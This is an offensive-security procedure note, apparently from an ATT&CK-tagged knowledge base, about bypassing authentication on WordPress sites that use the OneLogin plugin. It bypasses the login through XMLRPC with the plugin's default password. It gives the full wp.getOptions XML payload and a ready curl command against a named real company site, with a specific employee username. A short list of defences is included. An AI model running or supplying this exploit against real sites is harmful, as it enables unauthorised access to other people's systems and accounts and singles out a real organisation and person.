---
tags:
  - auth-bypass
  - xmlrpc
type: procedure
tools:
  - '[[tools/Curl-for-XMLRPC-Exploitation]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-xmlrpc-auth-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:52.550Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: fd6473e1-d1f1-4e71-9238-9a05cc6b320d
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Test-XMLRPC-Auth-with-Default-Credentials

## Summary

This procedure tests authentication bypass on WordPress sites using the OneLogin plugin's default password via the XMLRPC endpoint, confirming access to the internal user database without wp-login.php restrictions.

## Description

The OneLogin plugin creates users with password '@@@nopass@@@' and blocks normal logins but overlooks XMLRPC, which authenticates directly against the WP database. This allows unauthorized access to functions like wp.getOptions. Target WordPress 4.x sites with OneLogin; requires a valid username (e.g., from email leaks). Successful auth enables further exploitation like content creation or XSS.

## Requirements

1. Target URL with /xmlrpc.php exposed
2. Known OneLogin username (e.g., cbarry@uber.com)
3. Curl installed for HTTP POST
4. XML payload file (options.xml) with wp.getOptions call including appkey 'zzz', username, and password '@@@nopass@@@'

## Defense

Defensive measures and detection strategies:

- Disable XMLRPC entirely via plugins or .htaccess rules
- Enforce strong passwords and restrict OneLogin user creation
- Monitor XMLRPC logs for anomalous requests with default creds
- Use WAF to block XML payloads or suspicious auth attempts

## Objectives

1. Verify auth bypass and gain session
2. Retrieve site options to confirm access
3. Establish foothold for escalation

## Instructions

### Step 1: Prepare XML Payload

**Context**: Create options.xml with authentication test using wp.getOptions.

**Command** ([[commands/curl-xmlrpc-auth-bypass]]):
```bash
# First, create options.xml (example content):
# <?xml version="1.0"?>
# <methodCall>
# <methodName>wp.getOptions</methodName>
# <params>
# <param><value><string>zzz</string></value></param>
# <param><value><string>cbarry@uber.com</string></value></param>
# <param><value><string>@@@nopass@@@</string></value></param>
# </params>
# </methodCall>
```

> This constructs the payload; no execution here.

### Step 2: Send Payload and Authenticate

**Context**: POST the XML to xmlrpc.php to test and retrieve options.

**Command** ([[commands/curl-xmlrpc-auth-bypass]]):
```bash
curl 'https://newsroom.uber.com/xmlrpc.php' --data-binary "`cat options.xml`" -H 'Content-type: application/xml'
```

> Sends the request; success returns XML with options like software_name and blog_url.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-xmlrpc-auth-bypass]]

## Tools Used

- [[tools/Curl-for-XMLRPC-Exploitation]]

## Tags

- auth-bypass
- xmlrpc
- wordpress
